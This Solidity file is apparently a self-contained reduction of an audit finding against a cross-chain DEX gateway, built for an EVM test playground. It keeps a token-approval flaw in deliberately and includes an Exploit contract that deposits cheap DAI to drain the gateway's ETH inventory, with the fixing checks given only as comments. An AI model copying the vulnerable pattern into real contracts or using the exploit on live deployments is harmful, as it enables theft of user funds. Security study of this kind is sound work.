// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    DODO Cross-Chain DEX — [H-4] withdrawToNativeChain allows swapping
    arbitrary ZRC20s by misusing deposited amount (Sherlock 2025-05, #58581)

    SYNTHETIC, CHEATCODE-FREE reduction for the EVM Playground.
    Root cause: _doMixSwap approves params.fromToken (from user message) for
    `amount` (the deposited zrc20 amount) without requiring fromToken == zrc20.
    Attacker deposits cheap DAI, points fromToken at gateway-held ETH, and
    drains the high-value inventory via mixSwap. Vulnerable approve preserved
    VERBATIM (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

contract MockERC20 {
    string public symbol;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _symbol) {
        symbol = _symbol;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            uint256 a = allowance[from][msg.sender];
            require(a >= amt, "allow");
            allowance[from][msg.sender] = a - amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev Minimal DODORouteProxy: pulls fromToken from caller, pays toToken at fixed rate.
contract MockMixSwap {
    /// @notice 1 from unit → `price` to-token units (1e18 scale).
    mapping(address => mapping(address => uint256)) public price;

    function setPrice(address fromToken, address toToken, uint256 p) external {
        price[fromToken][toToken] = p;
    }

    function mixSwap(address fromToken, address toToken, uint256 fromTokenAmount)
        external
        returns (uint256 outputAmount)
    {
        MockERC20(fromToken).transferFrom(msg.sender, address(this), fromTokenAmount);
        uint256 p = price[fromToken][toToken];
        require(p > 0, "no price");
        outputAmount = (fromTokenAmount * p) / 1e18;
        require(MockERC20(toToken).transfer(msg.sender, outputAmount), "pay");
    }
}

/// @notice Reduction of GatewayTransferNative.withdrawToNativeChain + _doMixSwap.
///         Source: GatewayTransferNative.sol (sherlock-audit/2025-05-dodo @ d4834a4).
contract GatewayTransferNative {
    MockMixSwap public immutable dodoRouteProxy;
    address public immutable dodoApprove; // approve target (router itself in this reduction)

    constructor(MockMixSwap _router) {
        dodoRouteProxy = _router;
        dodoApprove = address(_router);
    }

    /// @param zrc20            token deposited by the user
    /// @param amount           deposited amount (post-fee in the real path)
    /// @param fromToken        params.fromToken from decoded message (USER-CONTROLLED)
    /// @param toToken          params.toToken
    /// @param fromTokenAmount  params.fromTokenAmount (swap quantity)
    /// @param receiver         withdrawal recipient
    function withdrawToNativeChain(
        address zrc20,
        uint256 amount,
        address fromToken,
        address toToken,
        uint256 fromTokenAmount,
        address receiver
    ) external {
        require(MockERC20(zrc20).transferFrom(msg.sender, address(this), amount), "in");

        // FIX: require(fromToken == zrc20, "fromToken mismatch");
        // FIX: require(fromTokenAmount <= amount, "amount");
        uint256 outputAmount = _doMixSwap(fromToken, toToken, amount, fromTokenAmount);
        _withdraw(toToken, receiver, outputAmount);
    }

    function _doMixSwap(address fromToken, address toToken, uint256 amount, uint256 fromTokenAmount)
        internal
        returns (uint256 outputAmount)
    {
        // Approves the user-chosen fromToken using the deposited `amount` as allowance —
        // spends the gateway's own balance of fromToken when it differs from zrc20.
        MockERC20(fromToken).approve(dodoApprove, amount); // @> VULN: approves params.fromToken (message-controlled) with deposited amount — no check that fromToken == zrc20, drains gateway inventory of a different ZRC20
        return dodoRouteProxy.mixSwap(fromToken, toToken, fromTokenAmount);
    }

    function _withdraw(address token, address receiver, uint256 amount) internal {
        require(MockERC20(token).transfer(receiver, amount), "out");
    }
}

contract AttackerReceiver {}

/// CREATE order: dai(1), eth(2), router(3), gateway(4), attackerRecv(5).
contract Exploit {
    MockERC20 public dai; // cheap deposit
    MockERC20 public eth; // high-value inventory on gateway
    MockMixSwap public router;
    GatewayTransferNative public gateway;
    AttackerReceiver public attackerRecv;

    uint256 public stolen;
    uint256 public constant DEPOSIT = 1 ether; // 1 DAI
    uint256 public constant ETH_INVENTORY = 1 ether; // 1 ETH on gateway
    uint256 public constant PRICE = 2500 ether; // 1 ETH → 2500 DAI

    constructor() {
        dai = new MockERC20("DAI.ETH"); // 1
        eth = new MockERC20("ETH.ETH"); // 2
        router = new MockMixSwap(); // 3
        gateway = new GatewayTransferNative(router); // 4
        attackerRecv = new AttackerReceiver(); // 5

        // Gateway holds high-value ETH (e.g. failed refunds).
        eth.mint(address(gateway), ETH_INVENTORY);
        // Router holds DAI liquidity for the swap output.
        dai.mint(address(router), 2500 ether);
        // Attacker holds 1 cheap DAI.
        dai.mint(address(this), DEPOSIT);

        router.setPrice(address(eth), address(dai), PRICE);
    }

    function run() external {
        uint256 gwEthBefore = eth.balanceOf(address(gateway));
        uint256 recvBefore = dai.balanceOf(address(attackerRecv));

        // Deposit cheap DAI; message params swap gateway's ETH → DAI.
        dai.approve(address(gateway), DEPOSIT);
        gateway.withdrawToNativeChain(
            address(dai), // zrc20 deposited
            DEPOSIT,
            address(eth), // params.fromToken ≠ zrc20  ← malice
            address(dai), // params.toToken
            DEPOSIT, // params.fromTokenAmount ≤ approved amount
            address(attackerRecv)
        );

        stolen = dai.balanceOf(address(attackerRecv)) - recvBefore;
        require(stolen == 2500 ether, "got 2500 DAI");
        require(eth.balanceOf(address(gateway)) == gwEthBefore - ETH_INVENTORY, "eth drained");
        // Cheap DAI deposit sits unused on the gateway (fees path simplified away).
        require(dai.balanceOf(address(gateway)) == DEPOSIT, "dai parked");
        require(stolen > DEPOSIT, "harm not demonstrated");
    }
}
